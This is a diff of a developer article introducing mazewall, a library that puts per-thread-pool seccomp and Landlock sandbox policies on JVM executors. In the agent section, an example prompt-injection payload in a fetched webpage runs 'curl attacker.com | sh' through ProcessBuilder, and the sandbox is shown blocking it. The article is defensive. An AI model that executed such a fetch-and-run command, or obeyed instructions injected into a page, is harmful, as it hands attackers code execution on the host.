@@ -1,12 +1,12 @@
 # Your Threads Are All Equally Trusted — Should They Be?
 
-> **What this is:** A short, developer-first introduction to mazewall. No BPF bytecode. No kernel internals. Just the question every backend developer should be asking about their thread pools — and what you can actually do about it.
->
-> **Before or after the series:** Read this before Part 1 if you want the "why bother?" answer first. Or read it after Part 4 if the attack walkthroughs made you wonder "but what do I actually change in my code?"
+> **What this is:** A developer-first introduction to mazewall—how to enforce OS-level sandboxing constraints directly on your JVM thread pools.
 
 ---
 
 ## The default you've never questioned
+
+In 2021, Log4Shell didn't just exploit a logging framework. It exposed a fundamental architectural flaw in the JVM: the moment an attacker achieves remote code execution on any thread, they gain the keys to your entire process. 
 
 Picture a typical backend service. It handles three kinds of work:
 
@@ -14,13 +14,11 @@ Picture a typical backend service. It handles three kinds of work:
 - **PDF generators** — read font files from disk, render documents
 - **Email senders** — connect to an SMTP server, fire and forget
 
-In most services these share a single thread pool — Spring's default task executor, a common `ForkJoinPool`, or whatever the framework hands out. The PDF generator doesn't import the email client. The HTTP handler doesn't call the PDF library. The separation exists in the code. But underneath, everything runs on the same shared pool.
+In most services, these share a single thread pool—Spring's default task executor, a common `ForkJoinPool`, or whatever the framework hands out. The separation exists in your source code. But underneath, everything runs on the same shared pool.
 
-But here's the question: does the OS know any of that?
+From the Linux kernel's perspective, every thread in your JVM process is identical. The PDF generator thread, if compromised through a dependency vulnerability, has the exact same permission to open outbound network sockets as your email sender. Your HTTP handler thread can spawn a reverse shell just as easily.
 
-No. From the Linux kernel's perspective, every thread in your JVM process is identical. The PDF generator thread, if compromised through a dependency vulnerability, has the exact same permission to open outbound network sockets as your email sender. Your HTTP handler thread could spawn a child process just as freely as if you'd deliberately written that code.
-
-The architectural walls in your code exist logically. They don't exist physically.
+The architectural walls in your code exist logically. They do not exist physically.
 
 ---
 
@@ -28,7 +26,7 @@ The architectural walls in your code exist logically. They don't exist physicall
 
 There are two ways to constrain what code can do:
 
-**Software-level constraints** — your code simply doesn't call certain APIs. You trust that `PdfGeneratorService` won't open a socket because you wrote it that way. This is the default everywhere, and it's fine until a dependency has a bug, a library is compromised, or an attacker achieves code execution inside your JVM.
+**Software-level constraints** — your code simply doesn't call certain APIs. You trust that `PdfGeneratorService` won't open a socket because you wrote it that way. This is the default everywhere, and it is fine until a dependency is compromised, a library has a critical bug, or an attacker achieves code execution inside your JVM.
 
 **Kernel-level constraints** — the OS itself refuses to carry out the operation. It doesn't matter what code is running or how it got there. The system call is intercepted before it reaches the kernel, and `EPERM` is returned. Full stop.
 
@@ -36,62 +34,9 @@ mazewall is about the second kind, applied directly to your thread pools, from i
 
 ---
 
-## Two levels of enforcement
-
-mazewall works in two tiers that stack on top of each other. Understanding the difference is the whole point of this article.
-
-### Tier 1: Process-wide baseline
-
-This is a rule that applies to your entire JVM process — every thread, every library, every future class that gets loaded.
-
-You call it once, at startup:
-
-```kotlin
-// Called once at application startup, before accepting any traffic.
-// After this line, no thread in this JVM can ever spawn a child process.
-ContainedExecutors.installOnProcess(Policy.NO_EXEC)
-```
-
-After that call, `ProcessBuilder.start()`, `Runtime.exec()`, and any native equivalent are permanently and irrevocably blocked for the entire JVM lifetime. The kernel will refuse them with `EPERM`.
-
-**When to use it:** For invariants that should be universally true. A backend service has no legitimate reason to spawn shell commands. Ever. Not the HTTP handler, not the GC thread, not a compromised library. Blocking `execve` process-wide costs nothing at runtime, and it turns the most common class of post-exploitation payload (spawn a reverse shell) into a dead end — regardless of which thread the attacker reaches.
-
-### Tier 2: Thread-scoped profiles
-
-This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM run completely unrestricted.
-
-```kotlin
-// This executor's threads can only do pure computation.
-// No network. No filesystem writes. No subprocess spawning.
-val pdfPool = ContainedExecutors.wrap(
-    Executors.newFixedThreadPool(4),
-    Policy.PURE_COMPUTE
-)
-
-// This executor's threads can connect outbound, but can't spawn processes.
-val emailPool = ContainedExecutors.wrap(
-    Executors.newSingleThreadExecutor(),
-    Policy.NO_EXEC
-)
-
-// This executor's threads can read only from /app/templates — nowhere else.
-val templatePool = ContainedExecutors.wrap(
-    Executors.newSingleThreadExecutor(),
-    Policy.builder()
-        .allowFsRead("/app/templates")
-        .build()
-)
-```
-
-These policies are installed on each thread the first time it executes a task. The JVM's own coordination threads — the garbage collector, the JIT compiler, the class loader — are untouched and continue to run without restriction.
-
-**When to use it:** When different parts of your application have meaningfully different access requirements. A PDF renderer has no business opening network connections. A data-processing worker has no business writing to arbitrary paths. Wrapping the executor makes your architectural intent into a physical enforcement boundary.
-
----
-
 ## A concrete scenario: the AI agent
 
-The agent sandbox demo in this repository shows this pattern applied to a real problem. An LLM-based agent orchestrates three tools:
+To see why this matters, consider a modern use case: an LLM-based agent orchestrating three tools:
 
 - **`fetchWebpage`** — makes outbound HTTP requests
 - **`analyzeUserFile`** — reads files from a workspace directory
@@ -100,40 +45,74 @@ The agent sandbox demo in this repository shows this pattern applied to a real p
 Each tool runs in its own contained executor:
 
 ```kotlin
-// Web tool: can make network calls, cannot spawn processes from untrusted call sites
-val webExecutor = ContainedExecutors.wrap(webRawExecutor, networkPolicy, webScopingPolicy)
-
-// File tool: can ONLY read from the workspace directory (Landlock enforcement)
-val fileExecutor = ContainedExecutors.wrap(fileRawExecutor,
-    Policy.builder()
-        .allowFsRead(workspaceDir.absolutePath)
-        .build()
+// Web tool: can make network calls, cannot spawn processes
+val webExecutor = ContainedExecutors.wrap(
+    webRawExecutor,
+    Policy.builder().allowNetworkConnect().denyExec().build()
 )
 
-// Analysis tool: CAN spawn processes, but only when called from executeDataAnalysis
-val analysisExecutor = ContainedExecutors.wrap(analysisRawExecutor, execPolicy, execScopingPolicy)
+// File tool: can ONLY read from the workspace directory (Landlock enforcement)
+val fileExecutor = ContainedExecutors.wrap(
+    fileRawExecutor,
+    Policy.builder().allowFsRead(workspaceDir.absolutePath).build()
+)
+
+// Analysis tool: CAN spawn processes, but only when executing data analysis tasks
+val analysisExecutor = ContainedExecutors.wrap(analysisRawExecutor, execPolicy)
 ```
 
-Now consider what happens during a prompt injection attack — where malicious content in a fetched webpage tries to hijack the agent into running a shell command:
+Now consider what happens during a prompt injection attack—where malicious content in a fetched webpage tries to hijack the agent into running a shell command:
 
 ```kotlin
 // Inside fetchWebpage(), a malicious instruction embedded in the page tries:
 val process = ProcessBuilder("sh", "-c", "curl attacker.com | sh").start()
 ```
 
-This runs on the `webExecutor` thread. That thread has `execve` blocked. The `ProcessBuilder` call throws `IOException`. The attack stops here. The file executor can't exfiltrate data over the network because `connect` is blocked on those threads. The analysis executor *can* run `execve`, but only from `executeDataAnalysis` — not from a hijacked web fetch.
+Because this runs on a thread in the `webExecutor`, and that thread has subprocess execution blocked at the OS level, the `ProcessBuilder` call throws an `IOException` immediately. The attack stops. The file executor cannot exfiltrate data over the network because `connect` is blocked on its threads.
 
-No external firewall rule. No container reconfiguration. The policy is declared next to the code that needs it.
+No external firewall rules. No container reconfiguration. The policy is declared next to the code that needs it.
+
+---
+
+## Two levels of enforcement: Two minutes to adopt
+
+mazewall works in two tiers that stack together.
+
+### Tier 1: Process-wide baseline
+
+This applies a rule to your entire JVM process—every thread, library, and future class loaded. You call it once at startup:
+
+```kotlin
+// Called once at application startup, before accepting any traffic.
+// After this line, no thread in this JVM can ever spawn a child process (execve is blocked).
+ContainedExecutors.installOnProcess(Policy.NO_EXEC)
+```
+
+**When to use it:** For invariants that should be universally true. A typical API service has no legitimate reason to spawn shell commands. Blocking `execve` process-wide costs nothing at runtime, and it turns the most common post-exploitation payload (spawn a reverse shell) into a dead end—regardless of which thread is compromised.
+
+### Tier 2: Thread-scoped profiles
+
+This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM (like GC, class loading, or unrestricted pools) run normally.
+
+```kotlin
+// This executor's threads can only do pure computation. No network, no disk writes, no subprocesses.
+val pdfPool = ContainedExecutors.wrap(
+    Executors.newFixedThreadPool(4),
+    Policy.PURE_COMPUTE
+)
+```
+
+Policies are installed on each thread the first time it executes a task—zero startup overhead for idle threads. For a complete multi-pool setup (network, filesystem, and exec policies), see **Part 3**.
 
 ---
 
 ## What changes in your development workflow
 
-More than the API surface suggests. If your service currently uses a single shared thread pool — which is the common default — adopting per-compartment policies means splitting it into dedicated pools: one for HTTP handling, one for document generation, one for outbound calls, and so on.
+Adopting thread-scoped policies means splitting generic shared thread pools into dedicated, specialized pools: one for HTTP handling, one for document generation, one for outbound calls, and so on.
 
-That is a genuine architectural change, not just a one-liner. It also has a real cost: more thread pools mean more OS threads and more context switches as work is dispatched across them. For I/O-heavy workloads this is usually negligible; for highly CPU-bound workloads at scale it is worth measuring.
+This is a genuine architectural change, not just a one-liner. It has a minor runtime cost: more thread pools mean more OS threads and context switches. For I/O-heavy workloads this is usually negligible; for highly CPU-bound workloads at scale, it is worth measuring.
 
-Once the pools are separated, the wrapping step itself is straightforward:
+Once separated, wrapping is simple:
 
 **Before:**
 ```kotlin
@@ -144,42 +123,66 @@ val documentPool = Executors.newFixedThreadPool(8)
 ```kotlin
 val documentPool = ContainedExecutors.wrap(
     Executors.newFixedThreadPool(8),
-    Policy.PURE_COMPUTE  // or Policy.NO_EXEC, or a custom policy
+    Policy.PURE_COMPUTE
 )
 ```
 
-The `ExecutorService` interface is unchanged — `submit()`, `invokeAll()`, `Future` all work as before. The only difference is what the kernel will and won't allow those threads to do.
+The `ExecutorService` interface is unchanged—`submit()`, `invokeAll()`, and `Future` work exactly as before. If you over-restrict and block something a thread legitimately needs, you will see an `IOException` or `SecurityException` during testing.
 
-If you over-restrict and block something the code genuinely needs, you should see an `IOException` or `SecurityException` during testing — provided your test suite exercises the affected code paths. There is no catch-all safety net here; untested paths can still surface violations in production.
+*Tip: The mazewall profiler module can automatically discover required system calls and paths during testing, helping you build accurate policies.*
 
 ---
 
-## The constraint you need to know
+## How to use it correctly: Threat Model & Boundaries
 
-Thread-scoped policies alone are **not** a complete security boundary against an attacker who has achieved arbitrary code execution inside the JVM. Because JVM threads share the same heap and address space, a sophisticated exploit can potentially corrupt memory on an unrestricted thread to escape a thread-scoped sandbox.
+Thread-scoped sandboxing alone is **not** an absolute security boundary against an attacker with Arbitrary Code Execution (ACE) on the sandboxed thread. Because all JVM threads share the exact same address space and heap, a native memory corruption exploit (e.g., via buffer overflow or unsafe pointer manipulation) on a contained thread could corrupt memory on unrestricted sibling or helper threads to achieve an escape.
 
 This is why the two tiers are designed to stack:
 
-- **Tier 1 (process-wide)** establishes the absolute backstop — things that no thread should ever do. This is the layer that remains meaningful even against memory corruption.
-- **Tier 2 (thread-scoped)** reduces the blast radius — it limits what a compromised thread can do before the attacker attempts escalation.
+1. **Tier 1 (process-wide)** establishes the absolute backstop—things no thread in your application should ever do (like spawning subprocesses). This remains meaningful even against memory corruption exploits.
+2. **Tier 2 (thread-scoped)** dramatically reduces the blast radius—limiting what a compromised thread can do before an attacker can attempt sophisticated heap escalation.
 
-Used together, a compromised thread that attempts to spawn a reverse shell is stopped at the process-wide layer. If it can't escalate, it's stuck within the narrow set of operations the thread pool was legitimately supposed to perform. In most real-world post-exploitation scenarios — Log4Shell-style RCE, XXE, SSRF — the attacker never gets the chance to attempt the more sophisticated escape.
+In most real-world post-exploitation scenarios (such as Log4Shell, XXE, SSRF), the attacker never gets the chance to attempt memory-level escalation.
 
 ---
 
 ## What this is not
 
-mazewall is one layer in a stack, not a replacement for any other part of it:
+mazewall is one layer in a security stack, not a replacement for:
 
-- **Container security** (Docker/Podman Seccomp profiles, network policies, cgroup limits) — the outer wall. Still necessary.
+- **Container security** (Docker/Podman Seccomp profiles, cgroups, network policies) — the outer wall. Still necessary.
 - **[Kubescape](https://kubescape.io)** — cluster-wide eBPF observation and behavioral profile generation across all workloads.
-- **[Tetragon](https://tetragon.io)** — kernel-level enforcement and real-time process observability using eBPF, operated at the node level.
-- **Authentication, input validation, secrets management** — unrelated concerns that mazewall does not touch.
+- **[Tetragon](https://tetragon.io)** — kernel-level enforcement and real-time process observability using eBPF, operated at the Kubernetes node level.
+- **Authentication, input validation, secrets management** — unrelated concerns.
 
-What mazewall adds is the one thing these layers cannot provide: enforcement that is aware of your application's internal thread structure. Kubescape and Tetragon see the JVM as a single black box. Docker applies one profile to every thread uniformly. mazewall lets you express different rules for different parts of the same process, enforced by the same kernel mechanisms — from inside the application, with no external agent required.
+Kubescape and Tetragon see the JVM as a single black box. Docker applies one profile to every thread uniformly. mazewall lets you express different rules for different parts of the same JVM process, enforced by the same kernel mechanisms—Seccomp-BPF (syscall-level filtering) and Landlock LSM (filesystem access control)—from inside the application, with no external agent required.
+
+---
+
+## Try it in your project
+
+Add the dependency to your build:
+
+```kotlin
+// build.gradle.kts — check https://github.com/Pilleo/mazewall/releases for the latest version
+implementation("io.mazewall:mazewall-enforcer:0.0.1-prealpha-SNAPSHOT")
+```
+
+And initialize a process-wide baseline in your application launcher:
+
+```kotlin
+fun main() {
+    ContainedExecutors.installOnProcess(Policy.NO_EXEC)
+    // Run your application...
+}
+```
 
 ---
 
 ## Where to go next
 
-**[Part 1: Do You Really Know What Your App Is Doing at Runtime?](article.md)** — The full case for behavioral security: why composition transparency (what's in the binary) is not the same as behavioral transparency (what the binary is doing right now), and where the industry is heading.
+- **[Part 1: Do You Really Know What Your App Is Doing at Runtime?](article.md)** — The full case for behavioral security: why composition transparency (what's in the binary) is not the same as behavioral transparency (what the binary is doing right now).
+- **Part 2: Thread-Scoped vs. Process-Wide Containment** — A deep dive into Seccomp-BPF and Landlock LSM mechanics within a shared-memory environment.
+- **Part 3: Sandboxing JVM Thread Pools in Practice** — Configuring executors, managing JIT coordination threads, and using the developer diagnostic suite.
+- **Part 4: Real-world Vulnerability Walkthroughs** — Exploiting and stopping Log4Shell, SSRF, and Prompt Injection step-by-step.
+- **Part 5: Production-grade Deployment and Monitoring** — Performance overhead, fallback behaviors, and handling kernel version discrepancies.
